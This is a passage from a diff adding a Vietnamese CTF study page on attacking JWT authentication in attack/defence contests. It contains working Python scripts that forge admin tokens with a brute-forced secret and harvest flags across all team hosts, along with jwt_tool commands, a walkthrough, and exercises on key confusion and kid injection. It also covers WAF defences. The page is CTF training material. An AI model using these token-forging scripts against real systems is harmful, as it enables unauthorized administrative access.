+    r = requests.get(<span class="s">f"http://{host}/admin/flag"</span>, headers={<span class="s">"Authorization"</span>: <span class="s">f"Bearer {token}"</span>}, timeout=5)
+    m = FLAG_RE.search(r.text)
+    <span class="k">return</span> m.group() <span class="k">if</span> m <span class="k">else</span> <span class="k">None</span>
+
+<span class="k">print</span>(<span class="s">"FLAG:"</span>, exploit_jwt(<span class="s">"TARGET_IP"</span>))</code></pre>
+
+  <h3>(C) Bản A/D tái dùng — chạy mọi đội, mọi round</h3>
+  <pre><code><span class="k">import</span> re, jwt, requests
+
+FLAG_RE = re.compile(<span class="s">r"FHACKER2026\{[0-9a-f]{64}\}"</span>)
+SECRET = <span class="s">"secret_da_brute_force_duoc"</span>   <span class="c"># bí mật GIỐNG NHAU mọi đội vì cùng service</span>
+
+<span class="k">def</span> <span class="d">exploit_jwt</span>(host):
+    <span class="k">try</span>:
+        token = jwt.encode({<span class="s">"user"</span>: <span class="s">"admin"</span>, <span class="s">"role"</span>: <span class="s">"admin"</span>}, SECRET, algorithm=<span class="s">"HS256"</span>)
+        r = requests.get(<span class="s">f"http://{host}/admin/flag"</span>, headers={<span class="s">"Authorization"</span>: <span class="s">f"Bearer {token}"</span>}, timeout=5)
+        m = FLAG_RE.search(r.text)
+        <span class="k">return</span> m.group() <span class="k">if</span> m <span class="k">else</span> <span class="k">None</span>
+    <span class="k">except</span> requests.RequestException:
+        <span class="k">return</span> <span class="k">None</span>
+
+<span class="k">if</span> __name__ == <span class="s">"__main__"</span>:
+    <span class="k">for</span> host <span class="k">in</span> open(<span class="s">"teams.txt"</span>).read().split():
+        flag = exploit_jwt(host)
+        <span class="k">if</span> flag:
+            <span class="k">print</span>(<span class="s">f"{host} {flag}"</span>)
+            <span class="k">with</span> open(<span class="s">"flags.txt"</span>, <span class="s">"a"</span>) <span class="k">as</span> f:
+                f.write(<span class="s">f"{flag}\n"</span>)</code></pre>
+  <div class="note tip"><span class="tag">Vì sao bản (C) dùng chung 1 SECRET cho mọi đội</span>Trong A/D, mọi đội
+  chạy <strong>cùng 1 service</strong> — nếu secret được hardcode trong source (không random mỗi lần deploy), nó
+  giống nhau ở mọi đội. Chỉ cần brute-force/tìm ra secret 1 lần (trên service của chính mình), dùng được cho toàn
+  bộ các đội khác.</div>
+ </div>
+</section>
+
+<!-- 09 -->
+<section class="block" id="s09">
+ <div class="wrap">
+  <div class="secnum">09 / VÍ DỤ THỰC TẾ END-TO-END</div>
+  <h2>Từ nhận service tới lấy flag</h2>
+  <div class="struct">
+    <div class="srow"><span class="n">1</span><div><div class="t">Recon</div><div class="d">Đăng nhập tài khoản thường, thấy cookie <code>token=eyJhbGciOiJIUzI1NiJ9...</code>.</div></div></div>
+    <div class="srow"><span class="n">2</span><div><div class="t">Decode</div><div class="d">CyberChef JWT Decode → header <code>{"alg":"HS256"}</code>, payload <code>{"user":"guest","role":"user"}</code>.</div></div></div>
+    <div class="srow"><span class="n">3</span><div><div class="t">Thử alg:none</div><div class="d">Sửa thành <code>alg:none</code>, bỏ chữ ký, gửi request với <code>role:admin</code> → Response: "Invalid token" ⟹ server có chặn alg:none.</div></div></div>
+    <div class="srow"><span class="n">4</span><div><div class="t">Brute-force secret</div><div class="d"><code>python3 jwt_tool.py TOKEN -C -d jwt-common.txt</code> → tìm được secret <code>"ctf2026"</code>.</div></div></div>
+    <div class="srow"><span class="n">5</span><div><div class="t">Tạo token giả</div><div class="d">Ký lại token với <code>role:admin</code>, secret <code>"ctf2026"</code> → gọi <code>/admin/flag</code> → Response hiện <code>FHACKER2026{...}</code>.</div></div></div>
+    <div class="srow"><span class="n">6</span><div><div class="t">Tự động hóa</div><div class="d">Dùng script (C) mục 08 với secret đã tìm được.</div></div></div>
+  </div>
+ </div>
+</section>
+
+<!-- 10 -->
+<section class="block" id="s10">
+ <div class="wrap">
+  <div class="secnum">10 / PHÒNG THỦ: VIẾT WAF RULE</div>
+  <h2>Chặn đúng payload, không chặn nhầm request thường</h2>
+  <div class="note warn"><span class="tag">Khó khăn đặc thù</span>WAF chặn theo nội dung request <strong>dạng
+  text</strong>, nhưng JWT là Base64 — chuỗi <code>"alg":"none"</code> không xuất hiện nguyên văn trong request,
+  nó nằm ẩn trong phần đã encode. WAF regex thuần khó bắt được trực tiếp trừ khi hỗ trợ decode trước khi so khớp.</div>
+  <table>
+    <tr><th>Cách tiếp cận khả thi</th><th>Hiệu quả</th></tr>
+    <tr><td>Chặn theo chữ ký Base64 của <code>{"alg":"none"</code> (tính sẵn chuỗi base64 tương ứng, so khớp trực tiếp trong token)</td><td>Bắt được alg:none cụ thể, nhưng dễ bị né nếu đổi khoảng trắng/thứ tự key trong JSON (ra base64 khác)</td></tr>
+    <tr><td>Giới hạn độ dài token hợp lý, cảnh giác token quá ngắn (dấu hiệu alg:none, vì thiếu hẳn phần signature)</td><td>Tín hiệu phụ, không chắc chắn</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 11 -->
+<section class="block" id="s11">
+ <div class="wrap">
+  <div class="secnum">11 / LỖI THƯỜNG GẶP & GỠ</div>
+  <h2>Khi payload không ăn</h2>
+  <table>
+    <tr><th>Triệu chứng</th><th>Nguyên nhân</th><th>Cách sửa</th></tr>
+    <tr><td>Token sửa xong bị từ chối dù dùng alg:none</td><td>Thư viện server chặn alg:none (phổ biến ở bản mới)</td><td>Thử Key Confusion (mục 06.C) hoặc brute-force secret (06.B)</td></tr>
+    <tr><td>Base64 decode lỗi "invalid padding"</td><td>JWT dùng Base64 URL-safe KHÔNG có padding <code>=</code> — một số tool decode mặc định cần padding đúng</td><td>Tự thêm <code>=</code> cho đủ bội số 4 trước khi decode, hoặc dùng đúng hàm <code>urlsafe_b64decode</code></td></tr>
+    <tr><td>Key Confusion không ăn dù có public key đúng</td><td>Thư viện server đã vá lỗi này (bắt buộc chỉ định đúng thuật toán khi verify, không đọc từ token)</td><td>Chuyển hướng khác (brute-force secret, kid injection)</td></tr>
+    <tr><td>jwt_tool báo lỗi thiếu thư viện</td><td>Chưa cài requirements</td><td><code>pip install -r ~/hoc/CTF/Tools/web/jwt_tool/requirements.txt</code> — làm trước ngày thi vì không có Internet lúc thi</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 12 -->
+<section class="block" id="s12">
+ <div class="wrap">
+  <div class="secnum">12 / NHẬN DIỆN & GIỚI HẠN</div>
+  <h2>Khi nào ĐƯỢC / KHÔNG dùng</h2>
+  <table>
+    <tr><th></th><th>Tình huống</th></tr>
+    <tr><td>✅</td><td>Thư viện verify không ép cứng thuật toán, bị ảnh hưởng bởi <code>alg</code> ghi trong token; secret HS256 yếu/đoán được; endpoint lộ public key RS256 mà server dùng chung biến key cho cả 2 kiểu verify.</td></tr>
+    <tr><td>❌</td><td>Server ép cứng thuật toán khi verify (<code>jwt.decode(token, key, algorithms=["HS256"])</code> — chỉ định rõ list cho phép) VÀ secret đủ dài/ngẫu nhiên (không brute-force nổi trong thời gian hợp lý).</td></tr>
+    <tr><td>❌</td><td>App dùng session cookie truyền thống (server tự lưu trạng thái), không dùng JWT — bài này không áp dụng.</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 13 -->
+<section class="block" id="s13">
+ <div class="wrap">
+  <div class="secnum">13 / BÀI TẬP & THUẬT NGỮ</div>
+  <h2>Luyện tập</h2>
+  <p>⭐ <strong>Làm lại:</strong> dựng ví dụ mục 09 bằng tay (decode CyberChef → thử alg:none → brute-force bằng
+  jwt_tool → tạo token admin).</p>
+  <details><summary>Gợi ý nếu kẹt</summary>Nhớ thử theo đúng thứ tự ưu tiên mục 06 — đừng nhảy thẳng vào
+  brute-force nếu chưa thử alg:none (nhanh hơn nhiều nếu ăn).</details>
+
+  <p>⭐⭐ <strong>Đổi 1 biến:</strong> server dùng RS256, có endpoint lộ public key. Thực hiện Key Confusion để
+  tự ký token admin.</p>
+  <details><summary>Gợi ý nếu kẹt</summary>Nhớ dùng ĐÚNG NGUYÊN VĂN định dạng PEM của public key (bao gồm cả dòng
+  <code>-----BEGIN PUBLIC KEY-----</code>) làm secret HMAC, không chỉ phần nội dung giữa.</details>
+
+  <p>⭐⭐⭐⭐ <strong>Tự nghĩ:</strong> header JWT có trường <code>kid</code> dùng để tra secret từ database theo
+  tên file/khóa. Thiết kế payload khai thác <code>kid</code> injection theo 2 hướng khác nhau (path traversal và
+  SQL injection) đã liệt kê ở mục 06.D.</p>
+  <details><summary>Gợi ý nếu kẹt</summary>Với path traversal, tìm 1 file trên server có nội dung bạn biết trước
+  (rỗng, hoặc 1 hằng số) để dùng làm "secret" đã biết.</details>
+
+  <h2>Thuật ngữ</h2>
+  <table>
+    <tr><td>Claim</td><td>Một trường dữ liệu trong payload JWT (vd <code>role</code>, <code>exp</code>, <code>user_id</code>).</td></tr>
+    <tr><td>HS256 / RS256</td><td>Thuật toán ký đối xứng (chung 1 khóa) / bất đối xứng (private/public key riêng).</td></tr>
+    <tr><td>Key Confusion</td><td>Lừa server verify token HS256 bằng chính public key RSA vốn dùng cho RS256.</td></tr>
+    <tr><td><code>kid</code> (Key ID)</td><td>Trường trong header JWT chỉ server biết dùng khóa nào để verify — có thể bị khai thác nếu server tra khóa theo kid một cách không an toàn.</td></tr>
+  </table>
+  <p style="margin-top:16px"><strong>Công cụ/tài liệu offline:</strong>
+  <code>~/hoc/CTF/Tools/web/jwt_tool/</code>, <code>~/hoc/CTF/Tools/web/CyberChef/</code>,
+  <code>~/hoc/CTF/Tools/web/PayloadsAllTheThings/JSON Web Token/</code>.</p>
+ </div>
+</section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <p>Chỉ dùng cho học tập &amp; thi CTF hợp pháp, trong phạm vi được cấp phép (F-Hacker 2026 Bảng C và tương tự).</p>
+  </div>
+</footer>
+
+<script>
+(function(){
+  "use strict";
+  var btn=document.getElementById("themeBtn");
+  function cur(){var a=document.documentElement.getAttribute("data-theme");if(a)return a;return window.matchMedia("(prefers-color-scheme:dark)").matches?"dark":"light";}
+  btn.addEventListener("click",function(){var n=cur()==="dark"?"light":"dark";document.documentElement.setAttribute("data-theme",n);try{localStorage.setItem("jwt-theme",n);}catch(e){}});
+  try{var s=localStorage.getItem("jwt-theme");if(s)document.documentElement.setAttribute("data-theme",s);}catch(e){}
+})();
+</script>
